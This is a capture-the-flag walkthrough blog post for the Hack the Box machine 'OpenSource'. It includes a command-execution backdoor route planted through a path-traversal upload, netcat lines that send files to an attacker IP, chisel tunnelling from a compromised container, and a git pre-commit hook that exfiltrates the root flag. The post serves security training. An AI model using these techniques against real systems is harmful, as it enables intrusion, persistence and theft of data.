+++
author = "Nick"
categories = ["hack the box", "Easy"]
date = 2022-10-07T11:00:00.000Z
publishDate = 2022-10-08T11:00:00.000Z
description = ""
draft = false
thumbnail = "/images/opensource/logo.png"
slug = "hack-the-box-opensource"
summary = ""
tags = ["hack the box", "Easy", "Linux", "Containers", "python", "git", "gitea", "pre-commit", "lfi", "code review"]
title = "Hack the Box - OpenSource"
url = "/hack-the-box-opensource"
+++

Welcome back everyone. It's been a while! This week we're going to be doing the machine OpenSource. This is listed as an easy Linux machine - let's jump in!

As usual, we start with an `nmap` scan of the target. Here are our results:

```
Host is up (0.059s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Thu, 29 Sep 2022 15:17:55 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Thu, 29 Sep 2022 15:17:56 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=9/29%Time=6335B727%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1030,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
SF:ython/3\.10\.3\r\nDate:\x20Thu,\x2029\x20Sep\x202022\x2015:17:55\x20GMT
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:5316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20
SF:\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=
SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\
SF:n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!
SF:</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jque
SF:ry-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stat
SF:ic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script
SF:\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\
SF:x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround
SF:\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href
SF:=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<li
SF:nk\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boo
SF:tstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\x20
SF:\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Thu,\x2029\
SF:x20Sep\x202022\x2015:17:56\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x20
SF:0\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTM
SF:L\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x
SF:20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x2
SF:0</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>E
SF:rror\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code
SF::\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20req
SF:uest\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20
SF:\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.74 seconds
                                                               
```

We see some standard ports - `22`, `80` and `3000`. Looks like we're running `Wrkzeug` and `Python 3.10`. We see from this that port `80` is hosting a file upload service - called Upcloud. We'll open `Burpsuite` and start taking a look. We land on the site and see we have a few options, we can upload a file and we also have the ability to download the software and host it ourself. So, we'll download the source and start looking through it. We download the `source.zip` file. We can unzip it with `unzip`.

![unziped](/images/opensource/opensource1.png)

As we sift through the souce, we don't really see anything interesting. What is useful, is that we have the `.git` directory. With this we can leverage `GitTools` to extract some information.

Command:
`git clone https://github.com/internetwache/GitTools `

First we make a quick `tmp` directory to place the reconstructed repo in. Now we can use the `Extractor.sh` tool to reconstruct the repo with commits. 

Command:
`./GitTools/Extractor/Extractor.sh . tmp/reconstruct`

You need to run `Extractor.sh` either in the directory with a `.git` or point to the repository. 

![Reconstructed repo](/images/opensource/opensource2.png)

Now with the repo reconstructed, we can sift through the data and find some kind of vulnerability. Now, we have these reconstructed directories, one of the best ways to get an idea of what type of work is being done in a previous repo is to use `git diff`. This will allow us to see what files have been changed through the course of development. Each of the directories above is a commit to the repository. We will start by checking the difference between them.

Command:
`git diff ee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f7`

![](/images/opensource/opensource3.png)

This shows us some credentials, assumably for some internal container proxies or service. Additional digging was fairly fuitless. Now as we've done a bit of digging with `GitTools`, we can now look at the actual files of the system a bit more closley. We know that the `views.py` file is where we saw the most action via `git diff`. That's where we'll start. Here is the code from `views.py`:

```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path)) 
```

We see that if we upload a file it calls the `get_file_name` function on the item. This function is in the `utils.py` file. Here is the code for those functions:

```python

"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""


def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


"""
TODO: get unique filename
"""


def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


"""
Recursively replace a pattern in a string
"""


def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

We see the `get_file_name` function call the `recursive_replace` function. This simply strips out and sort of `LFI` trickery by replacing the `../` with nothing. However, there is a hint here. We see the `TODO` comment says that it wants to ensure the filename is unique. Well, you guessed it, we can seemingly upload a duplicate file name and it will assumably overwrite the original file in that location. Yep, that's bad. So how do we leverage this? Well, we can start by editing the http requests in `Burpsuite`. Since the application doesn't check for anything else, there's a good chance we can dictate where to upload to.

To test this we will enable our `Interceptor` in `burpsuite` and upload a file.

![](/images/opensource/opensource4.png)

After some tinkering with the path ( we needed to have ..//app/app vs ../app or ../app/app) we can sucessfully upload a file to a different location on the server!

![](/images/opensource/opensource5.png)

Great, now we just need to make some kind of backdoor. We can add another @route to the `views.py` file. THis will essentially give us another endpoint to interact with via `burpsuite`. We want this endpoint to do something on the system. We can use Pythons `os.system()` to access the underlying OS. So now we need to write a quick route:

```python
@app.route('/pwn')
def pwn():
    return os.system(request.args.get('cmd'))
```

Now what we will do is call this endpoint and supply it with some arguments. But first, let's append this to an upload. I'm going to upload the original `views.py` file and append this custom route and change the file location via `burpsuite`.

![](/images/opensource/opensource6.png)

With that new file uploaded we can hit the `pwn` endpoint and send a command:

![](/images/opensource/opensource7.png)
![](/images/opensource/opensource8.png)

We get a connection back on our `netcat` listener! Although it's not that stable and fequently drops which makes this type of box difficult at times.
Once we've caught out connection back, we see we're running as `root`. Well that's not quite right. We do know from out previous enumeration and digging that the service runs in a container. So we just need to find our way out. We see that the container IP is `172.17.0.3`. We could assume that our gateway or host is the `172.17.0.1`. We can make a quick `bash` script to itterate through the ports or use your own method.

We see 3 ports, `22`,`80` and `3000`. Sounds familiar... We `wget` port `80` only get the upcloud hosting, as expected. When we get port `3000`.

Command:
Setup a listener:
`nc -lvnp 6660 >> index.html`

Send the file from the compromised container:
`cat index.html | nc 10.10.16.9 6660`

We see this is a `Gitea` instance. Now in order for us to actual use this `Gitea` instance, we need to use the web interface. Once again we will use [`Chisel`](https://github.com/jpillora/chisel).

If `Chisel` isn't already on your machine you'll need to `clone` the repo.

Command:
`git clone https://github.com/jpillora/chisel`

Now we can build the tool with `go build`. Alternatively, you can use the one liner to install `Chisel` on your machine and simply manke a copy.

Command:
Install Chisel:
`curl https://i.jpillora.com/chisel! | bash`

Make a copy in our working directory:
`cp $(which chisel) .`

Now we can launch a server on a port of our choosing:

Command:
`chisel server -p 7777 --reverse`

Now we need to put a copy of `chisel` on our compromised container. First we'll start up a quick web server.

Command:
`python3 -m http.server 80`

Then from the container we'll `wget` `chisel` from it.

Command:
`wget 10.10.16.9/chisel`

Now, we can connect back to our attacking machine with this copy of `chisel`.

Command:
`chisel client 10.10.16.9:7777 R:socks`

Now for the final set, `proxychains`. We need to add `socks5` to our config file. Simply append `socks5 127.0.0.1 1080` to the bottom of your `proxychains.conf` file and comment out `socks4`.

Now we can use tools via `proxychains`. In this case, it's just easier to add out proxychains configurations to `foxyproxy` or whatever proxy management addon you're using. Once we do that, we can see the contents of port `3000` in full!

![](/images/opensource/opensource10.png)

Now we can use those credentials from earlier to log into `Gitea`. 

Right as we log in we can see the last thing this user did was create a `home-backup` repo. Sure enough, inside this repo are some `SSH` keys.

![](/images/opensource/opensource11.png)

We'll quickly download these and try to `SSH` as this user. Once we log in, `user.txt` is just waiting for us!

Now, time to escalate. We copy over `linpeas` and let that run to see what it might find. `Linpeas` finds a ton of things, but nothing we can leverage. Usually after `linpeas` runs I run `pspy`. So we transfer over a copy of that and start snooping processes. After some time of monitoring the feed, I noticed a recurring job for backups.

![](/images/opensource/opensource12.png)

We can abuse something called [pre-commit](https://verdantfox.com/blog/view/how-to-use-git-pre-commit-hooks-the-hard-way-and-the-easy-way). Essentially these are scripts that can be run when a specific event happens in a git repository.

In the `dev01` users home directory, there is a `.git` directory. Inside this directory is the `hooks` directory. Here is where the `pre-commit` scripts are stored. We'll simply make a script that reach out to our attacking machine and we should have elevated access!

Like before a basic `netcat` outgoing connector doesn't work so we'll need to use a different method of connection. After MANY attempts at trying to get a stable outgoing connector, I decided to simply echo out the `root.txt` file and would cicle back around to the shell connection.

First, lets create a file called `pre-commit` in `~/.git/hooks`. Next we put our commands to be run in that file - mine looks like this:

```bash
cat /root/root.txt | nc 10.10.16.9 9090
```
Then we'll start up a listener on port 9090 and wait for the cron job to run.

![root](/images/opensource/opensource13.png)

There we have it, the root flag!
